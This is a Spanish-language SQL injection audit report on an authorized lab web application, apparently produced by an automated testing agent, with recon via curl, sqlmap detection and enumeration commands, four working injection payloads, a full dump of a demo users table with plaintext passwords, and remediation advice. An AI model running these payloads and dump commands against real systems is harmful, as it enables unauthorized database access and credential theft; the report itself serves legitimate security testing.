# Informe de Auditoría de Seguridad — SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-27T11:41:37Z  
**Herramientas:** curl, sqlmap 1.10.2  
**Clasificación:** CONFIDENCIAL — Entorno de laboratorio autorizado

---

## 1. Resumen Ejecutivo

Se realizó un análisis DAST (Dynamic Application Security Testing) sobre la aplicación web en `http://web.dev.local:8083`. Se identificó y explotó con éxito una vulnerabilidad crítica de **SQL Injection** en el parámetro GET `id`. La explotación permitió enumerar todas las bases de datos del servidor, extraer la estructura de tablas y volcar completamente la tabla `users` de la base de datos `sqli_demo`, obteniendo credenciales en texto claro de 8 usuarios, incluyendo el administrador.

**Severidad:** 🔴 CRÍTICA (CVSS v3: ~9.8)

---

## 2. Fase 1 — Reconocimiento

Se inspeccionó la URL objetivo con `curl`:

```
curl -s http://web.dev.local:8083/?id=1&Submit=Submit
```

**Hallazgos:**
- La aplicación presenta un formulario HTML con método `GET`.
- Parámetro identificado: **`id`** (tipo texto, enviado vía GET).
- La respuesta incluye datos de usuario (First name, Surname) correlacionados con el valor de `id`.
- Tecnologías detectadas: Apache 2.4.65, PHP 8.1.33, MySQL/MariaDB (Linux Debian).

**Vector de entrada identificado:**
```
GET /?id=<INPUT>&Submit=Submit HTTP/1.1
Host: web.dev.local:8083
```

---

## 3. Fase 2 — Escaneo de Vulnerabilidades

**Comando ejecutado:**
```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" -p id --batch --level=3 --risk=2
```

**Resultado:** El parámetro `id` fue confirmado como **VULNERABLE** a múltiples tipos de SQL Injection:

| Tipo | Técnica | Payload |
|------|---------|---------|
| Boolean-based blind | AND boolean-based blind (subquery - comment) | `id=1' AND 4855=(SELECT (CASE WHEN (4855=4855) THEN 4855 ELSE (SELECT 5578 UNION SELECT 1967) END))-- -` |
| Error-based | MySQL >= 5.1 EXTRACTVALUE | `id=1' AND EXTRACTVALUE(7032,CONCAT(0x5c,0x716a7a7671,(SELECT (ELT(7032=7032,1))),0x716b7a6a71)) AND 'VNQE'='VNQE` |
| Time-based blind | MySQL >= 5.0.12 SLEEP | `id=1' AND (SELECT 8779 FROM (SELECT(SLEEP(5)))fHXT) AND 'DaGw'='DaGw` |
| UNION query | Generic UNION query (NULL) - 2 columns | `id=1' UNION ALL SELECT NULL,CONCAT(0x716a7a7671,0x6776...,0x716b7a6a71)-- -` |

**DBMS backend:** MySQL >= 5.1 (MariaDB fork)  
**Sistema Operativo:** Linux Debian

---

## 4. Fase 3 — Explotación Activa

### 4.1 Enumeración de usuario y bases de datos

**Comando:**
```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" -p id --batch --current-user --current-db --dbs
```

**Resultados:**
- **Usuario actual de BD:** `root@%` ⚠️ (privilegios máximos)
- **Base de datos actual:** `sqli_demo`
- **Bases de datos disponibles (5):**
  - `information_schema`
  - `mysql`
  - `performance_schema`
  - `sqli_demo`
  - `sys`

### 4.2 Enumeración de tablas

**Comando:**
```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" -p id --batch -D sqli_demo --tables
```

**Resultado:** 1 tabla encontrada en `sqli_demo`:
- `users`

### 4.3 Volcado completo de credenciales

**Comando:**
```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" -p id --batch -D sqli_demo -T users --dump
```

**Datos extraídos — Tabla `sqli_demo.users` (8 registros):**

| user_id | username   | first_name | last_name | email               | password    |
|---------|------------|------------|-----------|---------------------|-------------|
| 1       | admin      | John       | Doe       | admin@example.com   | password123 |
| 2       | jsmith     | Jane       | Smith     | jane@example.com    | secret456   |
| 3       | bjohnson   | Bob        | Johnson   | bob@example.com     | mypass789   |
| 4       | awilliams  | Alice      | Williams  | alice@example.com   | qwerty123   |
| 5       | cbrown     | Charlie    | Brown     | charlie@example.com | password    |
| 6       | ddavis     | Diana      | Davis     | diana@example.com   | secure123   |
| 7       | emiller    | Eve        | Miller    | eve@example.com     | hackme      |
| 8       | fwilson    | Frank      | Wilson    | frank@example.com   | admin123    |

> ⚠️ **Las contraseñas se almacenan en texto claro**, lo que agrava enormemente el impacto de esta vulnerabilidad.

---

## 5. Análisis de Impacto

| Aspecto | Detalle |
|---------|---------|
| **Confidencialidad** | COMPROMETIDA — Credenciales de todos los usuarios expuestas |
| **Integridad** | EN RIESGO — El conector corre como `root`, permitiendo INSERT/UPDATE/DELETE |
| **Disponibilidad** | EN RIESGO — Posible DROP de tablas/bases de datos |
| **Escalada de privilegios** | POSIBLE — Acceso a `mysql` system database con usuario `root@%` |

---

## 6. Vectores Analizados

| Vector | URL / Parámetro | Método | Vulnerable |
|--------|----------------|--------|------------|
| Formulario búsqueda usuario | `/?id=<valor>&Submit=Submit` | GET | ✅ SÍ |

---

## 7. Recomendaciones

1. **Usar consultas parametrizadas (Prepared Statements)** — Nunca interpolar directamente la entrada del usuario en consultas SQL.
2. **Principio de mínimo privilegio** — La aplicación no debe conectarse a la BD como `root`. Crear un usuario específico con permisos solo de SELECT sobre las tablas necesarias.
3. **Hashear contraseñas** — Usar bcrypt/argon2 para almacenar contraseñas. Nunca en texto claro.
4. **WAF / Validación de entrada** — Implementar validación estricta de tipos (el campo `id` debería aceptar solo enteros).
5. **Gestión de errores** — No exponer errores detallados de base de datos al cliente.

---

## 8. Conclusión

La vulnerabilidad **SQL Injection en el parámetro `id`** de `http://web.dev.local:8083` ha sido **confirmada y explotada con éxito**. Se logró acceso completo a todas las bases de datos del servidor como usuario `root`, y se extrajeron las credenciales en texto claro de los 8 usuarios registrados en la aplicación. Esta vulnerabilidad es de **severidad CRÍTICA** y debe ser remediada de forma inmediata.

---

*Informe generado automáticamente por Agente DAST — 2026-04-27T11:41:37Z*
